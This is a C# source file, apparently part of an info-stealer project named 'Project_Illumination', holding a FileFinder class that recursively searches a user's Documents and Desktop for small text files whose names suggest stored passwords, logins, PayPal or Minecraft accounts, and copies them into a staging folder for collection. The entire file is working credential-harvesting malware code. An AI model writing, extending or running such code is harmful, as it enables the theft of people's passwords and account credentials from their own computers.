using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace Project_Illumination.Exploits
{
    internal class FileFinder
    {
        private readonly List<FileInfo> _foundFiles;
        private readonly List<Environment.SpecialFolder> _searchFolders;
        private readonly string[] _searchPatterns;
        private readonly string _path;

        public FileFinder()
        {
            _foundFiles = new List<FileInfo>();
            _searchFolders = new List<Environment.SpecialFolder>
            {
                Environment.SpecialFolder.MyDocuments,
                Environment.SpecialFolder.DesktopDirectory,
            };
            _searchPatterns = new [] {
                "pw", "pass", "passwort", "password", "alts", "root", "server", "login", "credentials", "creds", "console",
                "acc", "accounts", "account", "combo", "paypal", "minecraft", "mc"
            };
            _path = $@"{Paths.SAVE_PATH}\Found Files";

            Directory.CreateDirectory(_path);
        }

        public void Run()
        {
            Parallel.ForEach(_searchFolders, folder =>
            {
                _foundFiles.AddRange(FindFiles(Environment.GetFolderPath(folder))
                    .Select(f => new FileInfo(f))
                    .Where(info => info.Length != 0 && info.Length / (1024.0 * 1024.0) <= 1 && _searchPatterns.Any(info.Name.ToLower().Contains)));
            });

            _foundFiles.ForEach(f => File.Copy(f.FullName, $@"{_path}\{f.Name}"));
        }

        private static IEnumerable<string> FindFiles(string path, string filter = "*.txt", bool recursive = true)
        {
            IEnumerator<string> enumerator;
            try
            {
                enumerator = Directory.EnumerateFiles(path, filter,
                    recursive ? SearchOption.AllDirectories : SearchOption.TopDirectoryOnly).GetEnumerator();
            }
            catch (UnauthorizedAccessException)
            {
                yield break;
            }
            while (true)
            {
                try
                {
                    if (!enumerator.MoveNext()) break;
                }
                catch (UnauthorizedAccessException)
                {
                    continue;
                }
                yield return enumerator.Current;
            }

            enumerator.Dispose();
        }
    }
}
